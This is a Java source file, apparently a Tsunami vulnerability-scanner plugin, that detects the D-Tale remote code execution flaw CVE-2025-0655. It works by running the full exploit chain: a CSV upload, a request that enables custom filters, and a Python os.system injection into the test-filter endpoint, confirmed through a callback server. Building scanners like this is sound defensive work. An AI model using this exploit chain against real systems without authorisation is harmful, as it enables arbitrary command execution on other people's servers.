/*
 * Copyright 2025 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve20250655;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;
import static java.nio.charset.StandardCharsets.UTF_8;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.gson.JsonObject;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.URLEncoder;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2025-0655 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2025-0655 Detector",
    version = "0.1",
    description = "Checks for occurrences of CVE-2025-0655 in D-Tale instances.",
    author = "frkngksl",
    bootstrapModule = Cve20250655DetectorBootstrapModule.class)
@ForWebService
public final class Cve20250655VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;

  private static final String FILE_UPLOAD_PATH = "dtale/upload";
  private static final String UPDATE_SETTINGS_PATH =
      "dtale/update-settings/{{DATA_ID}}?settings=%7B%22enable_custom_filters%22%3Atrue%7D";
  private static final String EXECUTE_FILTER_PATH =
      "/dtale/test-filter/{{DATA_ID}}?query={{ENCODED_PAYLOAD}}&save=true";

  private static final String FILE_UPLOAD_BOUNDARY = "d26d385bb595e426e54760fa994ada3b";

  private static final String RCE_PAYLOAD =
      "@pd.core.frame.com.builtins.__import__('os').system('{{PAYLOAD}}')";

  private static final String FILE_UPLOAD_PAYLOAD =
      "--d26d385bb595e426e54760fa994ada3b\r\n"
          + "Content-Disposition: form-data; name=\"poc.csv\"; filename=\"poc.csv\"\r\n"
          + "Content-Type: text/csv\r\n"
          + "\r\n"
          + "a,b\n"
          + "1,1\r\n"
          + "--d26d385bb595e426e54760fa994ada3b\r\n"
          + "Content-Disposition: form-data; name=\"header\"\r\n"
          + "\r\n"
          + "true\r\n"
          + "--d26d385bb595e426e54760fa994ada3b\r\n"
          + "Content-Disposition: form-data; name=\"separatorType\"\r\n"
          + "\r\n"
          + "comma\r\n"
          + "--d26d385bb595e426e54760fa994ada3b\r\n"
          + "Content-Disposition: form-data; name=\"separator\"\r\n"
          + "\r\n"
          + "\r\n"
          + "--d26d385bb595e426e54760fa994ada3b--\r\n";

  private String dataId;

  private HttpClient httpClient;

  @Inject
  Cve20250655VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient =
        checkNotNull(httpClient, "HttpClient cannot be null.")
            .modify()
            .setFollowRedirects(false)
            .build();
    this.payloadGenerator = checkNotNull(payloadGenerator, "PayloadGenerator cannot be null.");
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean checkDtaleFingerprint(NetworkService networkService) {
    String targetWebAddress = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    var request = HttpRequest.get(targetWebAddress).withEmptyHeaders().build();

    try {
      HttpResponse response = httpClient.send(request, networkService);
      return response
          .bodyString()
          .map(
              body ->
                  body.contains(
                      "<p>You should be redirected automatically to the target URL: <a"
                          + " href=\"/dtale"))
          .orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return NetworkServiceUtils.isWebService(networkService)
        && checkDtaleFingerprint(networkService);
  }

  private boolean sendFileUploadRequest(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + FILE_UPLOAD_PATH;
    try {
      if (!FILE_UPLOAD_PAYLOAD.isBlank()) {
        HttpResponse httpResponse =
            httpClient.send(
                post(targetWebAddress)
                    .setHeaders(
                        HttpHeaders.builder()
                            .addHeader(
                                CONTENT_TYPE,
                                "multipart/form-data; boundary=" + FILE_UPLOAD_BOUNDARY)
                            .build())
                    .setRequestBody(ByteString.copyFromUtf8(FILE_UPLOAD_PAYLOAD))
                    .build(),
                networkService);
        logger.atInfo().log("Response from file upload: %s", httpResponse.bodyString().get());
        if (httpResponse.status().code() != 200 || httpResponse.bodyJson().isEmpty()) {
          return false;
        }
        JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
        if (jsonResponse.keySet().contains("success")
            && jsonResponse.get("success").getAsBoolean()
            && jsonResponse.keySet().contains("data_id")) {
          this.dataId = jsonResponse.get("data_id").getAsString();
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean enableCustomFilterRequest(NetworkService networkService) {
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + UPDATE_SETTINGS_PATH.replace("{{DATA_ID}}", this.dataId);

    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetWebAddress).withEmptyHeaders().build(), networkService);
      logger.atInfo().log("Response from queue view: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyString().isEmpty()) {
        return false;
      }
      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("success") && jsonResponse.get("success").getAsBoolean()) {
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private Payload generateCallbackServerPayload() {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    return this.payloadGenerator.generate(config);
  }

  private boolean executeFilterRequest(NetworkService networkService, Payload payload) {

    String urlEncodedPayload = RCE_PAYLOAD.replace("{{PAYLOAD}}", payload.getPayload());
    String targetWebAddress =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
            + EXECUTE_FILTER_PATH
                .replace("{{DATA_ID}}", this.dataId)
                .replace("{{ENCODED_PAYLOAD}}", URLEncoder.encode(urlEncodedPayload, UTF_8));
    logger.atInfo().log("Encoded payload: " + urlEncodedPayload);

    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetWebAddress).withEmptyHeaders().build(), networkService);
      logger.atInfo().log("Response from queue view: %s", httpResponse.bodyString().get());
      if (httpResponse.status().code() != 200 || httpResponse.bodyString().isEmpty()) {
        return false;
      }
      JsonObject jsonResponse = (JsonObject) httpResponse.bodyJson().get();
      if (jsonResponse.keySet().contains("success") && jsonResponse.get("success").getAsBoolean()) {
        return true;
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
    return false;
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    Payload payload = generateCallbackServerPayload();
    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atInfo().log(
          "The Tsunami callback server is not setup for this environment, so we cannot confirm the"
              + " RCE callback");
      return false;
    }
    logger.atInfo().log("Sending a File Upload Request!");
    if (!sendFileUploadRequest(networkService)) {
      return false;
    }

    logger.atInfo().log("Trying to enable custom filter!");
    if (!enableCustomFilterRequest(networkService)) {
      return false;
    }

    logger.atInfo().log("Trying to execute the payload!");
    if (!executeFilterRequest(networkService, payload)) {
      return false;
    }
    // Sleep because of callback request
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(5));
    return payload.checkIfExecuted();
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("CVE_2025_0655"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2025-0655 D-Tale Remote Code Execution")
                .setDescription(
                    "D-Tale is vulnerable to a Remote Code Execution vulnerability, which was fixed"
                        + " in version 3.16.1, due to Global State Override mechanism."
                        + " Specifically, this vulnerability leverages the ability to manipulate"
                        + " global  application settings to activate the enable_custom_filters"
                        + " feature, typically restricted to trusted environments. Once enabled,"
                        + " the /test-filter endpoint of the Custom Filters functionality can be"
                        + " exploited to execute arbitrary system commands.")
                .setRecommendation("You can upgrade your D-Tale instances to 3.16.1 or later."))
        .build();
  }
}
